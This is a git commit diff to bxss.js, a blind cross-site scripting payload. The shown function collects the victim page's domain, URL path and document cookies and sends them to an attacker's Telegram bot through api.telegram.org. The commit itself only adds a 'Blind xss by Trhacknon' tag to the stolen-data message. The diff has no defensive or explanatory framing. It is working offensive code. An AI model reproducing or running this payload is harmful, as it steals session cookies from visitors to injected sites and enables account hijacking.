416183249eb795b6f89bb285487b95d9ab3ca9b4
trhacknon <129875733+tucommenceapousser@users.noreply.github.com>
2023-06-18 00:25:39 +0200

    Update bxss.js

--- bxss.js
+++ bxss.js
@@ -12,7 +12,7 @@ var chatId = '-1001690993326'; // Your "chatId" Here
 */
 
 function telegramSend(tokenBot, chatId) {
-	var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
+	var textData = '<b>Blind+xss+by+Trhacknon</b><b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
     var xhr = new XMLHttpRequest();
     xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
     xhr.send();
